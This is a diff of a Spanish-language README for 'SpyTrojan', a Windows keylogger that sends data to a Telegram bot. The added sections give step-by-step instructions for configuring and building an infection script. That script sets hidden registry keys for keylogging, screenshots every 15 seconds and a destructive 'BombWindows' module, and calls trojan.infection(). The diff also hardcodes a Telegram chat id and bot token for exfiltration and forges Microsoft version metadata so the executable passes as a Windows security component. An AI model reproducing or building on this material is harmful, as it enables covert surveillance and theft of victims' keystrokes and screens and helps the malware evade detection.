@@ -28,6 +28,7 @@
 
 # __¡ Nota importante !:__ Ésta documentación está en proceso de escritura... algunos datos no están completas
 
+ <!--#region Carpeta Principal  -->
 # Carpeta Principal
 ![Archivos](https://imgur.com/eGfbb26.png)
 
@@ -52,12 +53,10 @@
 * __LICENSE__
 * __README .md:__` Documentación`
 * __SpyTrojan .py:__` Keyloggger TelegramBot`
-
 ---
-
+<!--#endregion -->
 
 # Caracteristicas
-
 - __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano
 
     `NOTA: imagen no actual`
@@ -103,8 +102,8 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 
 ![lista de requerimientos](https://imgur.com/PPgsmrH.png)
 
-
-## 2. Crear ejecutable del `SpyTrojanKeylogger.py` 
+<!--#region Crear ejecutable del `SpyTrojan.py -->
+## 2. Crear ejecutable del `SpyTrojan.py` 
 
 * __Paso 1:__  Abrir el archivo y remplazar la infomación según tus requerimientos.txt
 
@@ -167,8 +166,141 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 
 * __Nota:__  Al abrir el *.exe resultante, ésta mandará error lo cuál es normal ya que el software lee información del registro `[REGEDIT]`, información que todavía no se han creado.
 
+<!--#endregion -->
 
 
+## 3. Crear ejecutable del `InfectionFile.py` 
+
+Este Archivo se encargará de escribir en el registro de windows la configuración de nuestro virus, 
+según estos datos, el software funcionará de una u otra manera. 
+
+![](https://imgur.com/IVJl4NH.png)
+![](https://imgur.com/aPNBra0.png)
+![](https://imgur.com/zqVuye3.png)
+![](https://imgur.com/4y9GVdF.png)
+![](https://imgur.com/BUrOyKn.png)
+![](https://imgur.com/b2JM7tt.png)
+
+* __Paso 1:__  Abrir el archivo `InfectionFile.py` 
+    
+    <details>
+    <summary> Ver código completo</summary>
+    
+    ````py
+    if __name__ == '__main__':
+        # Se habilitarán futuras actualizaciones
+        AutoDestruction(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\AutoDestruction',
+                        active=0,
+                        active_now=0,  # ignore, will be used in a future update
+                        day=00,
+                        year=0000
+                        ).set_values()
+        BombWindows(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\BombWindows',
+                    active=0,
+                    active_now=0,   # ignore, will be used in a future update
+                    day=00,
+                    year=0000
+                    ).set_values()
+        Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
+                active=1,         #Cambie Aquí#
+                limit=150         #Cambie Aquí#
+                ).set_values()
+        Screenshot(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot',
+                active=1,        #Cambie Aquí#
+                intervalSeconds=15,#Cambie Aquí#
+                cache_path='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp'
+                ).set_values()
+        TelegramBot(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot',
+                    id=["-1001322369309"],  #Cambie Aquí#
+                    token="1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM", #Cambie Aquí#
+                    ).set_values()
+        trojan = Trojan(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide',
+                        debug=0,
+                        delay=0,
+                        path_software='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp',
+                        name_software= 'SpyTrojan.exe', #Cambie Aquí#
+                        username=str(os.getlogin())
+                        )
+        trojan.set_values()
+        trojan.infection()
+    ````
+</details> 
+
+* __Paso 2:__  Cambiar configuración del Keylogger
+
+    <details>
+    <summary> fgf</summary>
+
+    ````py
+    Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
+                active=1,         # Keylogger Habilitado = 1 °° Keylogger Habilitado = 1
+                limit=150         #Cambie Aquí#
+                ).set_values()
+    ````
+
+</details> 
+
+
+
+
+* __Paso 2:__  Abrir el archivo y remplazar la infomación según tus requerimientos.txt
+
+    ![lista de requerimientos](https://imgur.com/q79rmJb.png)
+
+    <details>
+            <summary> Click para ver el contenido del archivo.</summary>
+
+    ````r
+    VSVersionInfo(
+        ffi=FixedFileInfo(
+            filevers=(6, 1, 7601, 17514),
+            prodvers=(6, 1, 7601, 17514),
+            mask=0x3f,
+            flags=0x0,
+            OS=0x40004,
+            fileType=0x1,
+            subtype=0x0,
+            date=(0, 0)
+            ),
+        kids=[
+            StringFileInfo(
+            [
+            StringTable(
+                u'040904B0',
+                [StringStruct(u'CompanyName', u'Microsoft Corporation'),
+                StringStruct(u'FileDescription', u'Security Health Host Key'),
+                StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
+                StringStruct(u'InternalName', u'Windows Security Health Host Key'),
+                StringStruct(u'LegalCopyright', u'\xa9 Microsoft Corporation. All rights reserved.'),
+                StringStruct(u'OriginalFilename', u'SecurityHealthHostKey.exe'),
+                StringStruct(u'ProductName', u'Microsoft\xae Windows\xae Operating System'),
+                StringStruct(u'ProductVersion', u'6.1.7601.17514')])
+            ]), 
+            VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
+        ]
+    )
+    ````
+
+    ### Estos datos serán utilizados al momento de convertir nuestro *.py a *.exe
+
+    ![Info](https://i.imgur.com/MQAiVnJ.png) 
+    ![Info](https://i.imgur.com/mTBByRy.png)
+
+</details> 
+
+* __Paso 3:__  Convertir *.py a *.exe
+
+    ![](https://imgur.com/1M7P0aW.png)
+
+    <details>
+    <summary>Ver más</summary>
+    <p>El archivo <code># Create .EXE [SpyTrojan]-[Debug].bat</code> nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear el programa</p>
+    <p> El archivo <code># Create .EXE [SpyTrojan]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola. </p>
+    <br>
+    <b>El ejecutable resultante se guardará en una carpeta con los nombres <code>[DEBUG]</code>, <code>[RELEASE]</code> según sea el caso.</b>
+
+
+</details> 
 
 
 
